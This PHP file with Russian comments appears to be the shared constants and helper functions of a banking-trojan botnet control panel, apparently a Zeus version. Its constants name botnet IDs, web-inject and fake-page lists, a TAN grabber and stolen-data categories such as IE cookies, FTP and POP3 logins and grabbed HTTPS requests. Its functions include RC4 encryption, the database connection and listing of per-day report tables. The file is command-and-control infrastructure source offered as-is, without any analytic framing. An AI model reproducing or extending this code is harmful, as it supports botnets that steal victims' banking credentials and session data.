<?php error_reporting(E_ALL); set_time_limit(0); mb_internal_encoding('UTF-8'); mb_regex_encoding('UTF-8');

///////////////////////////////////////////////////////////////////////////////
// Константы.
///////////////////////////////////////////////////////////////////////////////

//Кодовая странци для MySQL.
define('MYSQL_CODEPAGE', 'utf8');
define('MYSQL_COLLATE',  'utf8_unicode_ci');

//Ботнет по умолчанию. Менять не рекомендуется.
define('DEFAULT_BOTNET', '-- default --');

//Некотрые данные о протоколе.
define('HEADER_SIZE',      28); //sizeof(BinCfg::HEADER)
define('HEADER_MD5',       12); //OFFSETOF(BinCfg::HEADER, MD5Hash)
define('ITEM_HEADER_SIZE', 16); //sizeof(BinCfg::ITEM)

//Конастанты сгенерированые из defines.php
//BEGIN
define('SBCID_BOT_ID', 10001);
define('SBCID_BOTNET', 10002);
define('SBCID_BOT_VERSION', 10003);
define('SBCID_BOT_STATUS', 10004);
define('SBCID_NET_LATENCY', 10005);
define('SBCID_PORT_S1', 10006);
define('SBCID_PATH_SOURCE', 10007);
define('SBCID_PATH_DEST', 10008);
define('SBCID_TIME_SYSTEM', 10009);
define('SBCID_TIME_TICK', 10010);
define('SBCID_TIME_LOCALBIAS', 10011);
define('SBCID_OS_INFO', 10012);
define('SBCID_LANGUAGE_ID', 10013);
define('SBCID_PROCESS_NAME', 10014);
define('SBCID_BOTLOG_TYPE', 10015);
define('SBCID_BOTLOG', 10016);
define('SBCID_SCRIPT_ID', 11000);
define('SBCID_SCRIPT_STATUS', 11001);
define('SBCID_SCRIPT_RESULT', 11002);
define('CFGID_LAST_VERSION', 20001);
define('CFGID_LAST_VERSION_URL', 20002);
define('CFGID_URL_SERVER_0', 20003);
define('CFGID_URL_ADV_SERVERS', 20004);
define('CFGID_URL_WFRULES', 20005);
define('CFGID_HTTP_BOTLOG_FILTER', 20006);
define('CFGID_HTTP_POSTDATA_FILTER', 20007);
define('CFGID_HTTP_FAKES_LIST', 20008);
define('CFGID_HTTP_INJECTS_LIST', 20009);
define('CFGID_HTTP_TANGRABBER_LIST', 20010);
define('CFGID_DNS_LIST', 20011);
define('BS_INSTALLED', 101);
define('BS_UPDATED', 201);
define('BS_ONLINE', 301);
define('BLT_UNKNOWN', 0);
define('BLT_PROTECTED_STORAGE', 1);
define('BLT_COOKIES_IE', 2);
define('BLT_FILE', 3);
define('BLT_HTTP_REQUEST', 11);
define('BLT_HTTPS_REQUEST', 12);
define('BLT_LOGIN_FTP', 100);
define('BLT_LOGIN_POP3', 101);
define('BLT_GRABBED_UI', 200);
define('BLT_GRABBED_HTTP', 201);
define('BLT_GRABBED_WSOCKET', 202);
define('BLT_GRABBED_OTHER', 299);
define('BOT_ID_MAX_CHARS', 100);
define('BOTNET_MAX_CHARS', 20);
define('BO_VERSION', '1.2.4.2');

//END

///////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////

/*
  Добавление заголовков HTTP для предотврашения кэширования браузером.
*/
function HTTPNoCacheHeaders()
{
  header('Expires: Fri, 01 Jan 1990 00:00:00 GMT'); //...
  header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0, pre-check=0, post-check=0'); //HTTP/1.1
  header('Pragma: no-cache'); // HTTP/1.0
}

/*
  Проверяет сущетвует ли в путе указатель на уровень выше '..'.
  
  IN $path - string, путь для проверки.
  
  Return   - bool, true - если сущетвует, false - если не сущетвует.
*/
function PathUpLevelExists($path)
{
  return (strstr('/'.str_replace('\\', '/', $path).'/', '/../') === false ? false : true);
}

/*
  Надстройка над basename, которая обрабатывает оба типа слеша, независимо от платформы.
  
  IN $path - string, строка для обработки.
  
  Return   - string, базовое имя.
*/
function basename_ex($path)
{
  return basename(str_replace('\\', '/', $path));
}

/*
  Преобразование GMT в текстовое представление.
  
  IN $bias - int, GMT в секундах.
  
  Return   - string, GMT в текстовое представление.
*/
function TimeBiasToText($bias)
{
  return ($bias >= 0 ? '+' : '-').abs(intval($bias / 3600)).':'.sprintf('%02u', abs(intval($bias % 60)));
}

/*
  Преобразование TickCount в hh:mm:ss
  
  IN $tc - int, TickCount.
  
  Return - string, hh:mm:ss.
*/
function TickCountToTime($tc)
{
  return sprintf('%02u:%02u:%02u', $tc / 3600, $tc / 60 - (sprintf('%u', ($tc / 3600)) * 60), $tc - (sprintf('%u', ($tc / 60)) * 60));
}

/*
  Добавление слешей в стиле JavaScript.
  
  IN $string - string, строка для обработки.
  
  Return     - форматированя строка.
*/
function addjsslashes($string)
{
  return addcslashes($string, "\\/\'\"");
}

/*
  Надстройка для htmlentities_ex, для форматирования в UTF-8.
  
  IN $string - string, строка для обработки.
  
  Return     - форматированя строка.
*/
function htmlentities_ex($string)
{
  /*
    HTML uses the standard UNICODE Consortium character repertoire, and it leaves undefined (among
    others) 65 character codes (0 to 31 inclusive and 127 to 159 inclusive) that are sometimes
    used for typographical quote marks and similar in proprietary character sets.
  */
  return htmlspecialchars(preg_replace('|[\x00-\x09\x0B\x0C\x0E-\x1F\x7F-\x9F]|u', ' ', $string), ENT_QUOTES, 'UTF-8');
}

/*
  Надстройка для number_format, для форматирования в int формате для текущего языка.
  
  IN $number - int, число для обработки.
  
  Return     - string, отформатированое число.
*/
function number_format_as_int($number)
{
  return number_format($number, 0, '.', ' ');
}

/*
  Надстройка для number_format, для форматирования в float формате для текущего языка.
  
  IN $number   - float, число для обработки.
  IN $decimals - количетсво цифр в дробной части.
  
  Return     - string, отформатированое число.
*/
function number_format_as_float($number, $decimals)
{
  return number_format($number, $decimals, '.', ' ');
}

/*
  Преобразование числа в версию.
  
  IN $i  - int, число для обработки.
  
  Return - string, версия.
*/
function IntToVersion($i)
{
  return sprintf("%u.%u.%u.%u", ($i >> 24) & 0xFF, ($i >> 16) & 0xFF,($i >> 8) & 0xFF, $i & 0xFF);
}

/*
  Конвертация данных о версии OS в строку.
  
  IN $os_data - string, данные OS.
  
  Return      - string, строквое представление версии OS.
*/
function OSDataToString($os_data)
{
  //!!! Выходная строка может содержать только символы A-Z, a-z, 0-9, пробел, -. Это сделано для уневирсальнйо строки html, plain.
  if(strlen($os_data) == 20 /*sizeof(DWORD) * 5*/)
  {
    $data = @unpack('L3ver/S2sp/Ssuite/Sproduct', $os_data);
    
    $name = '';
    
    //Базовое название.
    if($data['product'] == 1)//VER_NT_WORKSTATION
    {
      if     ($data['ver1'] == 5 && $data['ver2'] == 0)$name = '2000';
      else if($data['ver1'] == 5 && $data['ver2'] == 1)$name = 'XP';
      else if($data['ver1'] == 5 && $data['ver2'] == 2)$name = 'XP x64';
      else if($data['ver1'] == 6 && $data['ver2'] == 0)$name = 'Vista';
      else if($data['ver1'] == 7 && $data['ver2'] == 0)$name = 'Seven';
      
      if     ($data['suite'] & 0x0040)$name .= ' Embedded';     //VER_SUITE_EMBEDDEDNT
      else if($data['suite'] & 0x0200)$name .= ' Home Edition'; //VER_SUITE_PERSONAL
      else if($data['ver1'] == 5)     $name .= ' Professional';
    }
    else if($data['product'] == 3 || $data['product'] == 2) //VER_NT_SERVER || VER_NT_DOMAIN_CONTROLLER
    {
      if     ($data['ver1'] == 5 && $data['ver2'] == 0)$name = 'Server 2000';
      else if($data['ver1'] == 5 && $data['ver2'] == 2)$name = 'Server 2003';
      else if($data['ver1'] == 6 && $data['ver2'] == 0)$name = 'Server 2008';
      
      if     ($data['suite'] & 0x0400)$name .= ' Web Edition';             //VER_SUITE_BLADE
      else if($data['suite'] & 0x4000)$name .= ' Compute Cluster Edition'; //VER_SUITE_COMPUTE_SERVER
      else if($data['suite'] & 0x0080)$name .= ' Datacenter Edition';      //VER_SUITE_DATACENTER
      else if($data['suite'] & 0x0002)$name .= ' Enterprise Edition';      //VER_SUITE_ENTERPRISE
    }
    
    //Сервис пак.
    if($name != '')
    {
      $sp = $data['sp1'].($data['sp2'] == 0 ? '' : '.'.$data['sp2']);      
      return $name.' SP '.$sp.', build '.$data['ver3'];
    }
  }
  return 'Other';
}

/*
  Конвертация строки в строку с закоментроваными спец. символами SQL маски.
  
  IN $str - string, исходная строка.
  
  Return  - string, конченая строка.
*/
function ToSQLSafeMask($str)
{
  return str_replace(array('%', '_'), array('\%', '\_'), $str);
}

/*
  Получение списка таблиц отчетов по дням.
  
  IN $db - string, БД, из которой будет получены таблицы.
  
  Return - array, список таблиц, отсортированый по имени.
*/
function ListReportTables($db)
{
  $template = 'botnet_reports_';
  $tsize    = 15;//strlen($template);
  $list = array();
  
  if(($r = @mysql_list_tables($db)))while(($m = @mysql_fetch_row($r)))if(strncmp($template, $m[0], $tsize) === 0 && is_numeric(substr($m[0], $tsize)))$list[] = $m[0];
  
  @sort($list);
  return $list;
}

/*
  Проверка корректности значений переменной из массива $_POST.

  IN $name     - string, имя.
  IN $min_size - минимальная длина.
  IN $max_size - максимальная длина.

  Return       - NULL - если не значение не походит под условия,
                 string - значение переменной.
*/
function CheckPostData($name, $min_size, $max_size)
{
  $data = isset($_POST[$name]) ? trim($_POST[$name]) : '';
  $s = mb_strlen($data);
  if($s < $min_size || $s > $max_size)return NULL;
  return $data;
}

/*
  Подключение к базе и установка основных параметров.
  
  Return - bool, true - в случуи успеха, false в случаи ошибки.
*/
function ConnectToDB()
{
  if(!@mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS) || !@mysql_query('SET NAMES \''.MYSQL_CODEPAGE.'\' COLLATE \''.MYSQL_COLLATE.'\'') || !@mysql_select_db(MYSQL_DB))return false;
  return true;
}

/*
  Широфвание RC4
  
  IN $data - string, данные для шифрования.
  IN $data - string, ключ шифрования.ы
*/
function RC4($data, $key)
{
  $hash        = array();
  $box         = array();
  $ret         = '';
  
  $key_length  = strlen($key);
  $data_length = strlen($data);
  
  for($x = 0; $x < 256; $x++)
  {
    $hash[$x] = ord($key[$x % $key_length]);
    $box[$x]  = $x;
  }

  for($y = $x = 0; $x < 256; $x++)
  {
    $y       = ($y + $box[$x] + $hash[$x]) % 256;
    $tmp     = $box[$x];
    $box[$x] = $box[$y];
    $box[$y] = $tmp;
  }

  for($z = $y = $x = 0; $x < $data_length; $x++)
  {
    $z = ($z + 1) % 256;
    $y = ($y + $box[$z]) % 256;

    $tmp     = $box[$z];
    $box[$z] = $box[$y];
    $box[$y] = $tmp;

    $k       = $box[(($box[$z] + $box[$y]) % 256)];
    $ret    .= chr(ord($data[$x]) ^ $k);
  }

  return $ret;
}

/*
  Создание директории, включая весь путь.
  
  IN $dir - string, директория.
*/
function CreateDir($dir)
{
  $ll = explode('/', str_replace('\\', '/', $dir));
  $cur = '';
  
  foreach($ll as $d)if($d != '..' && $d != '.' && strlen($d) > 0)
  {
    $cur .= $d.'/';
    if(!is_dir($cur) && !@mkdir($cur, 0777))return false;
  }
  return true;
}
?>